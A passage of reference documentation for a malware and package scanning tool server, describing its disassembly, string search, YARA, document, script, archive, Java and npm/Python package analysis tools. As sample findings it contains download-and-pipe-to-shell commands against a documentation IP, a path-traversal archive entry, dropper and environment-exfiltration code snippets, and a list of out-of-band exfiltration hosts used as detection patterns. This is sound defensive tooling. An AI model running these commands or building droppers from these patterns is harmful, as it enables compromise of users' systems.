other machine value is an error that names it (`Unsupported PE machine 0x1c0; supported: x86 (0x14c), x86-64 (0x8664),
ARM64 (0xaa64). The architecture is not supported`). A PE without function symbols has an empty function list (`total:
0`): pass `address`, for example the entry point. A bounded part of the disassembly (the first 20,000 instructions) is
cached; code outside it is decoded again on every call, which takes about a second on a large file. The answer says so
in `window_note` and carries `cache: "partial"`. A function is found by any function name in the symbol table, also on a
file with more than 5,000 functions: its listing is the symbol's range and `function.listed_from` says it came from the
symbol table. An imported name has no code to list and is refused, and so is a substring that matches more than one
function (the error lists them). A name that no function has is an error that also says the symbol table has none.
Following `next_address` of such a listing continues past the symbol's end, because an address lists from that
instruction on. An address outside the decoded range is an error that says where the listing is: "No instruction at 0x10
in this file's disassembly (the next one is at 0x1460)", then "The listing holds 773 rows in 0x1460..0x20c9
(instructions, and a `.byte` row for each byte that could not be decoded); addresses outside that range are not listed,
and read_hex shows the raw bytes there." `total_instructions` counts decoded instructions. A listing of a range also
counts `.byte` rows for bytes that could not be decoded, so the two can differ by that count (3,767 against 3,881 on the
x86_64 slice of `/bin/ls`).

### read_hex

Raw bytes as a hex dump.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `offset` | Start (default 0). Negative counts from the end: `-64` is the last 64 bytes. |
| `length` | Default 256, at most 4,096. |

```json
{
  "file_path": "/samples/test_programs/c_advanced_binary",
  "offset": 0, "length": 32, "total_bytes": 22088, "end_of_file": false,
  "lines": [ "00000000  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  |.ELF............|", ... ],
  "next_offset": 32
}
```

An offset at or past the end of the file is an error that gives the file size.

### compare_files

Are two files the same, and what do they share? It does not diff bytes or code.

| Argument | Notes |
| --- | --- |
| `file_a`*, `file_b`* | Absolute paths. |
| `max_items` | Items listed per group (default 20, at most 200). |

```json
{
  "identical": false,
  "file_a": { "size": 22088, "format": "ELF", "architecture": "x86_64", "entropy": 3.37, ... },
  "file_b": { "size": 41168, "format": "ELF", "architecture": "x86_64", "entropy": 4.89, ... },
  "size_delta": 19080, "entropy_delta": 1.526, "same_format": true,
  "imports": { "a": 38, "b": 54, "common": 12, "only_in_a": 26, "only_in_b": 42, "similarity": 0.15,
               "common_items": ["__cxa_finalize", ...], "lists_capped": "each list shows at most 3 items ..." },
  "sections": { ... }, "categorized_strings": { ... },
  "next_steps": [ ... ]
}
```

Identical SHA-256 returns a short `{"identical": true}`.

### search_strings

Search the strings of one file, or of every file indexed in this session. At least one of `query`, `regex`,
`category`, `min_entropy` or `suspicious_only` is required: the tool never lists every string.

| Argument | Notes |
| --- | --- |
| `query` | Case-insensitive substring. |
| `regex` | Regular expression (Rust syntax). |
| `file_path` | One file. Omit to search every string indexed this session. |
| `category` | For example `network`, `command`, `execution`, `crypto`, `path`, `credential`. |
| `min_entropy`, `suspicious_only` | Entropy floor; only strings flagged suspicious. |
| `min_length` | With `file_path`: shortest string to extract (2 to 256, default 4). |

With `file_path` the answer is `scope: "file"` and lists each match with its offsets:

```json
{
  "scope": "file", "file_path": "/samples/test_programs/c_advanced_binary", "cache": "miss",
  "strings_in_file": 189, "scanned_bytes": 22088,
  "items": [ { "value": "ptrace", "offset": 2046, "offsets": [2046], "count": 1, "encoding": "ascii",
               "categories": ["file_string", "generic"], "entropy": 2.58, "suspicious": false }, ... ],
  "total": 2, "returned": 2, "offset": 0
}
```

Without it, `scope: "session"`: each item has `total_occurrences`, `files_total` and up to 5 `files`, and a `hint`
that says `file_path` searches one file and gives offsets. Strings are indexed by `analyze_file` and by this tool;
files you have not touched are not searched. `next_steps` are `{tool, arguments, gives}` objects: `string_details` for
the first string and, in session scope, the same search on one file. With `--allow-root` the session search lists
only strings of files inside a root.
Limits: indexing a file stops at 200,000 strings or 32 MiB of text, and says so.

### string_details

Everything known about one exact string: files, offsets, categories, entropy and related strings.

| Argument | Notes |
| --- | --- |
| `value`* | The string as `search_strings` returned it (a unique prefix of a cut value also works). |
| `related_limit` | Related strings to list (default 10, at most 50). |
| `offset`, `limit` | Page of files. |

```json
{
  "value": "Debugger detected!", "total_occurrences": 1, "files_total": 1,
  "files": [ { "file_path": "/samples/test_programs/c_advanced_binary", "file_hash": "91f09b...",
               "occurrences": 1, "offsets": [12682] } ],
  "categories": ["file_string", "generic"], "entropy": 3.19, "suspicious": false,
  "related": [ { "value": "__GNU_EH_FRAME_HDR", "score": 0.75 }, ... ]
}
```

Strings indexed by `analyze_file` are tracked too, but `analyze_file` records offsets only for strings of 4 or more
characters. A string of 2 or 3 characters, or one past the index's scan or count limits, shows `offsets: []` and
`occurrences` as the count `analyze_file` listed (1 for each distinct string), not the count in the file; the file
row's `offsets_note` says so, and `search_strings` with `file_path` gives the real offsets and count. A value that was
never tracked is an error that says how to get it tracked. With `--allow-root` only files inside a root are shown: a
string that is tracked only in files that no longer resolve inside a root (for example a file that was replaced by a
link out of the root after it was indexed) is answered like an untracked one.

### llm_analyze_file

A small, fixed-size digest of one file for writing a detection rule. Choose it over `analyze_file` when you want a
YARA rule or one answer that fits a small context; use `analyze_file` to investigate what a file does.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `token_limit` | Output budget in characters of compact JSON (about 4 per token, default 25,000). |
| `min_string_length` | At least 1 (default 6). |
| `max_strings`, `max_imports`, `max_opcodes` | Defaults 50, 30, 10. |
| `hex_pattern_size` | Bytes per header and footer pattern, 1 to 1,024 (default 32). |
| `suggest_yara_rule` | Default true. |

```json
{
  "sha256": "91f09b18...", "md5": "5ad5e32b...", "file_size": 22088,
  "file_type": "ELF 64-bit shared object or PIE executable (x86-64)", "architecture": "x86_64", "is_packed": false,
  "key_strings": ["127.0.0.1", "/proc/self/status", "TracerPid:", "Debugger detected!", "msftupdater.com", ...],
  "hex_patterns": ["7F 45 4C 46 02 01 01 00 ...", ...],
  "imports": ["getenv", "free", "strcpy", "ptrace", "connect", ...],
  "opcodes": ["F3 0F 1E FA", "31 ED", ...],
  "entropy": 3.37,
  "yara_rule_suggestion": "rule c_advanced_binary { ... condition: filesize == 22088 and 3 of ($s*) and $header at 0 }"
}
```

The draft rule is a starting point. It is tied to this one file (note the `filesize` condition); edit it before you
use it on other samples. If the digest does not fit, what was cut is listed under `truncated`, and `truncated.how`
names the limit that was hit: `max_output_bytes` (with its maximum) or `token_limit`. Opcodes come from the entry
point of an ELF or PE file; an ARM64 PE (`file_type` `PE32+ executable (ARM64)`) gives 4-byte ARM64 instructions. For
a PE whose machine is not x86, x86-64 or ARM64, `opcodes` is empty and `notes` says `opcodes: none, unsupported PE
machine 0x1c0: the architecture is not supported`. For a Mach-O, `notes` says `opcodes: none, entry-point opcodes are
supported for ELF and PE files`. For a universal Mach-O, `file_type` reads `Mach-O universal binary (3 slices:
x86_64, arm64e, arm64-subtype-12)`, with the slice names that `arch` accepts. If no rule could be built,
`yara_rule_note` says why.

### yara_scan_file

Scan a file or directory with YARA rules (YARA-X).

| Argument | Notes |
| --- | --- |
| `path`* | Absolute path of a file or directory. |
| `yara_rule` | Rule text, or the word `builtin` for the scanner's own rule set (max 5 MiB of text). |
| `rule_path` | A rule file, or a directory of `.yar`/`.yara` files: 20 MiB, 5 MiB a file, 1,000 files. No `include`. |
| `recursive` | Default true. |
| `max_file_size` | Bytes; default and ceiling 100 MB. Larger files are listed under `skipped`. |
| `detailed_matches` | List matched strings (default true). |
| `max_matches_per_rule` | 1 to 1,000, default 10. `strings_total` has the full count. |
| `max_rules_per_file` | 1 to 1,000, default 100. |
| `max_files` | 1 to 100,000, default 10,000. |
| `timeout_seconds` | 1 to 600, default 60. Covers the walk under `path` and the scan, not loading `rule_path`. |
| `offset`, `limit` | Page of matching files (default 50). |

One of `yara_rule` and `rule_path` is required. A call without `offset` always scans anew; later pages are served
from that scan's kept result for 10 minutes (`cache: "hit"`).

```json
{
  "total_files_scanned": 25, "total_matches": 2, "files_matched": 2, "rules_compiled": 1,
  "rule_hits": [ { "rule": "beacon_dropper", "files": 2 } ],
  "matches": [
    { "file_path": "/samples/test_programs/c_advanced_binary", "file_size": 22088,
      "matches": [ { "rule_identifier": "beacon_dropper", "tags": [], "metadata": {},
                     "strings": [ { "identifier": "$a", "offset": 12337, "length": 15, "value": "msftupdater.com" },
                                  { "identifier": "$b", "offset": 12360, "length": 20, ... } ],
                     "strings_total": 2 } ],
      "rules_total": 1 }, ... ],
  "errors": [], "skipped": [], "files_not_scanned": 0, "timed_out": false, "limits_reached": [],
  "matches_total": 2, "matches_returned": 2, "matches_offset": 0, "cache": "miss"
}
```

A rule that does not compile is an error with the compiler's message, line and column:

```text
Failed to compile YARA rule (yara_rule): error[E025]: unknown pattern `$b`
 --> yara_rule:1:41
```

Limits: whatever was cut is named under `limits_reached`. When many files were skipped, one message says `skipped
names the first N of M files` and `skipped_total` has the count. A symbolic link to a directory that you give as
`path` is scanned and not listed under `skipped`; a link inside the tree is listed there as not followed, and a FIFO,
socket or device is skipped without being opened. Under `--allow-root` the server checks each entry under
`path` as the walk reaches it, inside `max_files` and `timeout_seconds`, not the whole tree first. A symbolic link
that leaves the roots refuses the call when the walk reaches it, so a call with a small `max_files` may succeed on
a tree where a full scan is refused. `rule_path` is different: it is checked whole before the scan. A rule file
named directly is loaded whatever its extension; only a directory is filtered to `.yar` and `.yara` files.

### analyze_document

PDF and Microsoft Office files (`.doc`, `.xls`, `.ppt`, `.docx`, `.docm`, `.xlsm`, `.pptm`). The type is detected from
the first bytes.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `category` | PDF: see list below. Office: `auto_exec`, `keyword`, `network`, `modules`. |
| `module` | Office only: one VBA module's source lines (paged) instead of findings. |
| `offset`, `limit` | Page of findings (default 0 and 50, at most 500). |
| `max_output_bytes` | Byte budget of the answer, as for every tool. |

PDF categories: `action`, `script`, `link`, `launch`, `submit`, `attachment`, `evasion`, `encryption`.

```json
{
  "cache": "miss",
  "summary": {
    "format": "pdf", "version": "1.4", "pages": 1, "objects": 4, "encrypted": false, "open_action_type": "action",
    "risk": { "level": "critical", "score": 65,
              "reasons": ["JavaScript present (1 reference(s))", "OpenAction runs when the document opens", ...] },
    "feature_counts": { "JS": 1, "JavaScript": 1, "OpenAction": 1 },
    "next_steps": [ { "tool": "analyze_document", "arguments": { "file_path": "...", "category": "action" },
                      "gives": "each risky name with byte offsets" },
                    { "tool": "analyze_document", "arguments": { "file_path": "...", "category": "script" },
                      "gives": "the JavaScript" }, ... ]
  },
  "findings": { "items": [ { "category": "script", "severity": "high", "offset": 206, "object": 4, "length": 13,
                             "preview": "app.alert(1);", "suspicious_patterns": [] } ],
                "total": 1, "returned": 1, "offset": 0 }
}
```

Office files report whether a VBA project exists, its modules, auto-execute entry points and suspicious keywords with
module and line. Limits: module count, bytes read and decompressed, and keyword hits are capped, and the summary says
so; a file that could not be read in full is never rated low: an encrypted PDF is rated at least medium, and so is
a PDF in which no object could be read (reason `Nothing could be read`). Up to 5,000 link targets (category `link`)
are listed; launch and submit targets are capped at 200, and the summary `notes` say when the rest cannot be
retrieved. A file that is neither PDF nor Office gives an error that names the right tool.

### analyze_script

One script file: shell, PowerShell, JavaScript, Python, batch or VBScript.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `language` | Force `shell`, `powershell`, `javascript`, `python`, `batch` or `vbscript`. Default: detect. |
| `category` | One finding category (listed below the table). |
| `min_severity` | `low`, `medium`, `high` or `critical`. |
| `line_from`, `line_to` | Scan this range of lines (1-based, inclusive) again; not cached. |
| `offset`, `limit` | Page of findings (default 0 and 50, at most 500). |
| `max_output_bytes` | Byte budget of the answer, as for every tool. |

Categories: `download_execute`, `dynamic_execution`, `encoded_payload`, `persistence`, `credential_access`,
`defense_evasion`, `remote_shell`, `command_execution`, `obfuscation`, `privilege_escalation`.

```json
{
  "cache": "miss",
  "summary": { "language": "Shell", "line_count": 4, "detected_by": "shebang",
               "risk": { "level": "high", "score": 55 }, "findings_total": 2,
               "category_counts": { "download_execute": 1, "persistence": 1 } },
  "findings": { "items": [
    { "category": "download_execute", "rule": "curl_pipe_shell", "severity": "critical", "line": 3,
      "matched": "curl -s http://203.0.113.7/payload.sh | sh",
      "description": "downloads a script and pipes it straight into a shell" },
    { "category": "persistence", "rule": "cron", "severity": "high", "line": 4, "matched": "crontab", ... } ],
    "total": 2, "returned": 2, "offset": 0 }
}
```

A whole-file scan keeps 2,000 findings. When there are more, `summary.notes` says so and names the line the kept
findings reach; call again with `line_from` and `line_to` to scan a range and reach the rest (the answer then has a
`range` object, and the score and counts stay those of the whole file). A `line_from` after `line_to` is an error.
An unknown language, category or severity, binary input, or an undetectable language is an error. For a package
use the package tools; for a binary use `analyze_file`.

The language is decided from a shebang for a supported language, then the extension, then the content
(`summary.detected_by` says which). A script whose shebang names an interpreter the tool does not support (`perl`,
`ruby`, `php`, `lua`, `tclsh`, `awk` and similar) and that has no known script extension is refused with `Could not
tell which language ... (no shebang for a supported language, no known script extension, and the content matched no
language)`; pass `language` to force one. With a known extension the extension decides: a `.sh` file with a Perl
shebang is rated as shell. `csh` and `tcsh` shebangs are not on the unsupported list, so an extensionless csh script
is rated by its content.

### inspect_archive

List the entries of an archive without extracting it: `.zip` (and `.jar`, `.apk`, `.docx` and other ZIP-based files),
`.tar`, `.tar.gz`/`.tgz`, `.rar` (4 and 5) and `.7z`.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `filter` | Case-insensitive text in the entry path. |
| `risky_only` | Only entries with a medium or higher risk indicator. |
| `offset`, `limit` | Page of entries (default 0 and 50, at most 500). |
| `max_output_bytes` | Byte budget of the answer, as for every tool. |

```json
{
  "sha256": "f8f7c8ec...", "cache": "miss",
  "summary": { "format": "gzip-compressed tar archive (.tar.gz)", "entries": 3, "listed_entries": 3,
               "uncompressed_bytes": 60, "encrypted": false, "risk": "critical", "risk_score": 100,
               "possible_bomb": false, "unsafe_paths": 1, "nested_archives": 0, "notes": [],
               "unsafe_path_examples": [ { "entry_path": "../../etc/cron.d/job", ... } ] },
  "entries": { "items": [
    { "path": "../../etc/cron.d/job", "kind": "file", "size": 21, "mode": "0644",
      "risks": ["PathTraversal (critical): Entry path escapes the extraction directory: ..."] },
    { "path": "invoice.pdf.exe", "kind": "file", "size": 32,
      "risks": ["Executable (medium): ...", "DoubleExtension (high): ..."] } ],
    "total": 2, "returned": 2, "offset": 0 },
  "risky_only": true
}
```

Entry risk flags: path traversal, links leaving the extraction root, device nodes, setuid bits, executables, double
extensions, and a possible compression bomb (`CompressionBomb (critical)` on the entry; the summary also has
`possible_bomb: true` with the sizes and ratio, and the archive risk is `critical`). These are what `risky_only`
selects. The listing is cached by SHA-256, so paging does not parse the archive again. Limits: encrypted or compressed
RAR and 7z headers cannot be listed; `.tar.bz2` and `.tar.xz` are recognized but not listed. When a listing is
unavailable, partial or capped, `entries`, `uncompressed_bytes` and `compression_ratio` in the summary are `null`
(always present) and the risk is `unknown`, not `low`; the `analyze_file` overview of an archive leaves those keys out
instead. Password-protected entries are not opened: a note says how many, the risk is `medium` when some entries are
encrypted and `unknown` when all are, and the note ends with `Get the password and extract them to inspect their
content.` Nested archives are listed in a note (up to 5 names) and not opened; a risk that would be `low` becomes
`unknown`, and the note says to extract and inspect them. Neither case has a next step, because neither is a call.
`next_steps` are `{tool, arguments, gives}` calls: the next page, `risky_only`, and `analyze_java_file` for a Java
archive. Every step repeats `file_path`, so a very long path at a small `max_output_bytes` leaves room for fewer rows:
the page then drops the `risky_only` and `analyze_java_file` steps and lists fewer `summary.unsafe_path_examples`
(`summary.unsafe_paths` keeps the count), and the paging step is always kept whole.

### analyze_java_file

A Java archive (JAR, WAR, EAR, AAR, APK) or a class file, decided from the content and not the extension.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `view` | `summary` (default), `classes`, `findings`, `resources`, `class`, `manifest`, `android`, `nested`. |
| `class` | Class name for `view: "class"` (dots or slashes), or `<container>!<class>` as `example_classes` gives it. |
| `filter` | Substring: class, container or API; path; attribute; kind or name; archive path. |

```json
{
  "view": "summary", "archive_type": "Jar",
  "counts": { "entries": 3, "classes": 1, "resources": 3, "nested_archives": 0, "dex_files": 0, ... },
  "java_versions": { "Java 8 (major 52)": 1 },
  "manifest": { "main_class": "app.Loader", "class_path": [], ... },
  "signing": { "status": "no signature files found", "files": [] },
  "security": {
    "threat_level": "High",
    "basis": ["process_exec APIs referenced (1 class reference(s))",
              "deserialization APIs referenced (1 class reference(s))"],
    "top_findings": [
      { "category": "process_exec", "api": "java.lang.Runtime.exec", "severity": "High", "classes": 1,
        "example_classes": ["app.Loader"] }, ... ] },
  "next_steps": [ { "tool": "analyze_java_file", "arguments": { "file_path": "...", "view": "findings" },
                    "gives": "every dangerous API with class counts and example classes" }, ... ],
  "cache": "miss"
}
```

Dangerous APIs (process execution, reflection, class and native loading, network, crypto, deserialization, JNDI,
scripting, `Unsafe`) are read from the class constant pool. `view: "findings"` carries `threat_basis` beside
`threat_level`. Nested archives are opened up to two levels deep (an EAR's WAR's libraries) within byte caps; a third
level is reported as not opened. They are named by their full path from the analyzed file, joined with `!`, for example
`a.war!WEB-INF/lib/util.jar`; the nested rows, a class's `container`, `also_in` and the `example_classes` of a finding
(`web.war!WEB-INF/lib/x.jar!pkg.Cls`) use that form, and `filter` matches the outer archive too. In `view: "class"`,
a bare class name picks the first copy and lists the others in `also_in`; `<container>!<class>`, with the container
exactly as printed (slashes included), picks one copy, and a miss names the container and lists close matches with
their containers. `cache_clear` and `--no-cache` apply to this tool as to every other. Not done: signatures are
listed as "present, not verified"; `classes.dex` is not parsed, so APK code is not assessed (an archive with DEX
files is rated at least Medium, with the basis `<n> DEX file(s) hold Dalvik code that is not parsed`); there is no
vulnerable-library (CVE) check.

### analyze_npm_package

Vet a local npm package. The tool is offline: it never downloads anything.

| Argument | Notes |
| --- | --- |
| `package_path`* | A `.tgz`/`.tar.gz` (from `npm pack`), a package directory, `package.json` or `package-lock.json`. |
| `section` | `summary` (default), `findings`, `files`, `dependencies`, `scripts`. |
| `query` | Substring filter on a finding, file or dependency name. |
| `min_severity` | `findings` only: `Critical`, `High`, `Medium` or `Low`. |
| `only_flagged` | `files` or `dependencies` only: just those with findings or advisories. |

```json
{
  "package": { "name": "left-pad-utils", "version": "1.0.3" },
  "input": { "kind": "tarball", "manifest": "package/package.json", "files_total": 2, "files_scanned": 1, ... },
  "risk": { "level": "Critical", "score": 100.0,
            "reasons": ["1 known-malicious pattern(s): Suspicious network activity",
                        "dynamic code execution of decoded or dynamic content",
                        "4 finding(s) in source files (see section findings)",
                        "an install-time script runs suspicious code: Download piped to a shell or interpreter (scripts.postinstall)",
                        "1 known vulnerability(ies) in dependencies (0 critical, 1 high)", ...] },
  "findings": { "total": 4, "by_severity": { "critical": 1, "high": 2, "medium": 1, "low": 0 },
    "top": [
      { "rule": "Download piped to a shell or interpreter", "category": "download-exec", "severity": "Critical",
        "file": "package/package.json#scripts.postinstall", "line": 1,
        "evidence": "curl -s http://203.0.113.7/p.sh | sh" },
      { "rule": "Private key or cloud credential file", "severity": "High", "file": "package/index.js", ... },
      { "rule": "Eval of decoded payload", "severity": "High", "file": "package/index.js", "line": 3, ... }, ... ] },
  "install_scripts": { "has_postinstall_script": true, "hooks": ["postinstall"], "dangerous_commands": 1 },
  "dependencies": { "direct": 1, "with_advisories": 1, "vulnerable": ["lodash"], ... },
  "advisory_data": { "source": "small built-in table compiled into file-scanner; nothing is fetched",
                     "last_updated": "2025-01-06", "newest_advisory": "2022-03-16", "package_count": 6,
                     "offline": true, "coverage_note": "An empty vulnerability list means ... not in this table ..." },
  "next_steps": [ { "tool": "analyze_npm_package", "arguments": { "package_path": "...", "section": "findings" },
                    "gives": "source findings with file, line and evidence, worst first" }, ... ],
  "cache": "miss"
}
```

A registry name such as `express` or `lodash@4.17.4` is an error: run `npm pack express` and pass the `.tgz`. A
specifier that a shell would misread is single-quoted in the command the error suggests (`npm pack 'lodash@^4'`).

Limits: up to 400 source files, 1 MiB each and 16 MiB in all, are scanned (`.js .jsx .mjs .cjs .ts .tsx .mts .cts`,
`.py .pyw .pth` and `.sh .bash .zsh .cmd .bat .ps1`; the Python tool reads the same extensions); a package that
was not read in full is never rated safe. The advisory data is a small offline table (6 packages, newest advisory
2022). An empty vulnerability list does not mean the package is clean.

What raises the rating, in both package tools:

- A download that is written to disk and run, a download passed to code evaluation, a credential file sent over the
  network, or the whole environment sent over the network is a High source finding. The statements must lie within 60
  lines of each other (8 for the environment), in order; lines over 1,000 characters are not judged by these checks.
- The environment counts as sent only when the whole environment is in the sent value (`JSON.stringify(process.env)`,
  `dict(os.environ)`, `os.environ.copy()`, `.items()`). One named variable on a line with a URL or an HTTP call
  (`process.env.API_URL`, `os.environ.get('X')`, `os.getenv('X')`) is a base URL, a token or a proxy setting, not a
  finding: a package that only does that rates Safe.
- A run counts as the run of a download only when it starts what was written. It is tied to the write when it names
  the same variable, the same field (`this.path`, `self.path`), the same expression written again
  (`path.join(os.tmpdir(), name)`), or any word of the write's path argument, however short (`'/tmp/x.sh'` gives `tmp`,
  `x` and `sh`; generic words such as `path`, `join`, `os`, `tmpdir` and `name` do not count), or a whole quoted
  literal of 4 or more characters from the value of the variable that holds the path (`'/tmp'` after
  `dest = path.join('/tmp', 'out.bin')`), or when its command is a shell or an interpreter (`sh`, `bash`, `node`,
  `python`, `chmod`) started on a variable or an expression (`spawn(shell, [...])`, `spawn('sh', ['-c', script])`,
  `exec('sh ' + dest)`). A command held in a variable is followed one assignment back,
  wherever in the file the assignment is (before the run). A run whose first argument is a call
  (`cp.execFile(path.join(os.tmpdir(), name))`) is seen as a run.
- A run whose first argument is a quoted literal is seen as a run in JavaScript (`spawn`, `exec`, `execSync`,
  `execFile`, `fork`) and in Python (`subprocess.*`, `os.system`, `asyncio.create_subprocess_*`) when its text names
  the written path. After `fs.writeFileSync('/tmp/x.sh', body)`, `cp.spawn('/tmp/x.sh')`, `cp.spawn('sh',
  ['/tmp/x.sh'])` and `cp.exec('sh /tmp/x.sh')` are each a High `Download written to disk and run`, and so is
  `subprocess.run(['/tmp/agent.bin'])` after `urlretrieve(url, '/tmp/agent.bin')`. A literal run that names another
  path (`cp.execFile('/opt/other')` after a write to `/tmp/x.sh`) is not tied. A shell or interpreter started only on
  fixed text (`spawn('node', ['scripts/build.js'])`, `execSync('sh -c "echo done"')`, `spawnSync('python3', ['-V'])`),
  and a generic runner that starts whatever it is given (`spawn(command, args)`), are not tied to an unrelated write
  that is a few lines away (`fs.writeFileSync('/var/cache/app/data.json', body)`). After a write of a `.sh` file, a
  literal command that starts with `sh` (`execSync('sh -c "echo done"')`) is tied and rates High 60.
- Python tuple assignments give each name the assigned value, so after `fd, path = tempfile.mkstemp()` a write with
  `os.write(fd, data)` is a write and `os.system(path)` is tied to it.
- Compiled TypeScript spellings are read like the plain ones: `node_https_1.default.get` and `.request` are network
  calls, `node_fs_1.default.writeFileSync` and `(0, node_fs_1.writeFileSync)(...)` are file writes, and
  `node_child_process_1.spawn`, `node_child_process_1.default.spawn` and `(0, node_child_process_1.execSync)(...)` are
  runs. A compiled postinstall dropper rates Critical 95, like the plain one. A compiled file that writes
  `JSON.stringify(process.env)` to a request (`req.write`) is reported as `Environment sent over the network`.
- In Python, `asyncio.create_subprocess_exec` and `create_subprocess_shell` are a Medium `Process execution` finding
  and count as runs, and `aiohttp.ClientSession` and `aiohttp.request` count as a download. An async dropper
  (`aiohttp` download, write, `create_subprocess_exec` on the written path) rates High 60. Benign asyncio worker code
  stays Safe, with a score of 8 instead of 0.
- A High `Exfiltration endpoint` finding is a webhook or out-of-band host: Discord, Telegram and Slack webhook URLs,
  `webhook.site`, `requestbin.`, `pipedream.net`, `oast.pro`, `oast.live`, `oast.site`, `oast.online`, `oast.fun`,
  `oast.me`, `interact.sh`, `burpcollaborator.net` and `ngrok` hosts. The out-of-band and webhook names match only as
  whole host names, and an `ngrok` host only with a word boundary after the TLD, so property reads such as
  `toast.promise` or `cfg.webhook.siteUrl` are not findings.
- High 'Decoded payload passed to process execution' (category `obfuscation`): `exec`, `execSync`, `spawn` or
  `spawnSync` given a base64 or hex `Buffer`, `atob` or `String.fromCharCode` (JavaScript), and `os.system`,
  `os.popen` or `subprocess.*` given `b64decode`, `fromhex`, `unhexlify` or `codecs.decode` (Python). A package whose
  only High finding is this one rates at least High: `cp.exec(Buffer.from(..., 'base64').toString())` rates High 68,
  and `subprocess.Popen(base64.b64decode(...), shell=True)` rates High 68; with other findings the package can reach
  Critical. The finding is also listed as `injection_type: "Decoded payload passed to process execution"` under
  `other_signals.code_injection_patterns` in the `findings` section.
- A file named by an install hook (`preinstall`, `install`, `postinstall`, `prepare`, `prepublish`) is install-time
  code. Its High findings, and any obfuscation finding in it (obfuscator identifiers, an escaped or char-code string
  blob), raise the package to at least High, appear in `install_scripts.dangerous_commands` and in a risk reason such
  as `an install-time script runs suspicious code: Obfuscator identifiers (postinstall runs setup.js)`. The runner is
  read from the command (`node`, `sh`, `python`, or a direct `./path`). The file is followed through `cd dir && node
  file`, leading `NAME=value` words, an extensionless path (`node scripts/setup` finds `scripts/setup.js`, `.cjs`,
  `.mjs` or `scripts/setup/index.js`) and a directory (`node scripts`); a path that leaves the package is not
  followed, and neither is a file reached only through `require()` or a runner such as `npx`.
- In a Python package, an obfuscation finding in `setup.py` raises the package to at least High with the reason
  `setup.py runs suspicious code at install time: <rule> (line N)`.
- A dependency (direct, lock-pinned or transitive) on a release the built-in table marks as malicious rates at least
  High (reason `depends on N known malicious release(s): ...`, listing `name@version` in the npm tool and
  `name==version` in the Python tool, for example `ctx==0.1.2`); `dependencies.known_malicious_releases` lists them and
  the rows in the `dependencies` section are marked `known_malicious_release: true`.
- A suspected typosquat (`typosquatting.suspected`) rates at least Medium.
- A tarball, sdist or zip with an entry that has `..`, an absolute path or a link is rated at least High: one finding
  per entry (category `unsafe-path`) and a note that begins `UNSAFE ARCHIVE ENTRIES`.

All of this is heuristic. The tie between a run and a write is a name and literal match, so a dropper that builds its
command far from the write and shares no name with it can be missed. A file that a hook runs, or `setup.py`, is judged
High only for obfuscation findings; other Medium findings there add nothing. The cached answers of both package tools
use the keys `package:npm:v3` and `package:python:v3`, so results that an earlier build stored are recomputed.

Known limits of the package ratings (both tools, from the same scanner):

- An environment held in an object or variable and then sent is not detected. `const payload = { env: process.env };
  fetch(url, { method: 'POST', body: JSON.stringify(payload) })` and `const e = process.env;` followed by
  `JSON.stringify(e)` are not reported as `Environment sent over the network`. Only a whole `process.env` (or
  `os.environ`) used directly in or next to the request is.
- A count of the environment is read as the whole environment: sending only `Object.keys(process.env).length` in a
  request body is reported as `Environment sent over the network`.
- A shell started on a variable after an unrelated download and write is treated as running the download. If a file
  downloads something, writes it to disk and, within 60 lines, starts a shell or interpreter on a variable, the run is
  tied to the download, whatever the variable holds. A task runner whose update check caches the latest version and
  then calls `spawn('sh', ['-c', script])` rates High 60 `Download written to disk and run`; so does the
  `execSync('sh -c ' + script)` spelling. When the command comes from the downloaded data, the finding is accurate.
- A run that shares a word with the written path is tied to the write. A run whose text contains any word of the
  write's path argument, however short (a directory name, the file name or its extension: after a write to
  `/srv/data/out.bin`, `execSync('ls /usr/bin')` rates High 60), or a whole literal of 4 or more characters from the
  variable holding that path, counts as running the written file. Benign build helpers rate High 60: a schema
  downloaded into `node_modules/.cache` and then `node node_modules/.bin/tsc`, a data file downloaded into `build/` and
  then `make -C build`, JSON saved under `/tmp` and then `du -sh /tmp`.
- Compiled TypeScript spellings have the false alarms of the plain spelling. Logging `JSON.stringify(process.env)` in
  a compiled file that also makes a request (`node_https_1.default.request` and `req.write`) rates Critical. A
  download through an object whose name ends in `http` (`this._http.get`), written to a file and followed by
  `git add` on it, rates High.
- Detection-rule text shipped as data still rates as a reverse shell. A package that ships reverse-shell command
  strings in a data file, such as detection rules in a mock file, rates Critical `Reverse shell`.
- Benign asyncio subprocess code rates Safe with a small bump: a worker that calls `asyncio.create_subprocess_exec`
  or `create_subprocess_shell` gets a Medium `Process execution` finding and a score of 8 or 13 instead of 0 or 5.
- A host name is a host name: a property read that spells a listed out-of-band host in full (`cfg.oast.pro`) still
  rates as an `Exfiltration endpoint`.

### analyze_python_package

The same tool for Python, with the same arguments and answer shape.

| Argument | Notes |
| --- | --- |
| `package_path`* | `.whl`, `.tar.gz`, `.zip`, a directory, `setup.py`, `pyproject.toml`, `requirements.txt`. |
| `section`, `query`, `min_severity`, `only_flagged` | As for `analyze_npm_package`. |

A `poetry.lock` file is accepted as a dependency list. For a requirements file, a lock file or a wheel, `section:
"scripts"` has no `setup_type` and a note says there is no setup script; `suspicious_imports` lists modules only, and
the rule names are under `dangerous_operations`. A wheel that ships a `.pth` file with findings lists them there as
`{operation, location, risk_reason}` (`site_speedups.pth:1`), and the note says Python runs the code in a `.pth` file
every time it starts. `setup.py` is checked for install-time behaviour. A PyPI name such as `requests==2.5.0` is an
error: run `pip download 'requests==2.5.0' --no-deps -d <dir>` and pass the file; a name with shell characters (`<`,
`>`, `!`, `~`, `=`, `^`) is single-quoted there. Version matching follows PEP 440 with normalized names; an unpinned
requirement is unknown, not vulnerable. Limits: up to 400 source files, 1 MiB each and 16 MiB in all (the same
extensions as for the npm tool). The advisory data is a small offline table (7 packages, newest advisory 2023).

### cache_status

What the caches hold, and where.

| Argument | Notes |
| --- | --- |
| `action` | `stats` (default); `list` (past `analyze_file` and `yara_scan_file` calls, newest first); `search`. |
| `tool_name`, `file_path_pattern` | Filters for `list` and `search`; `search` needs one. |

```json
{
  "enabled": true, "persistent": true, "directory": "/Users/you/Library/Caches/file-scanner",
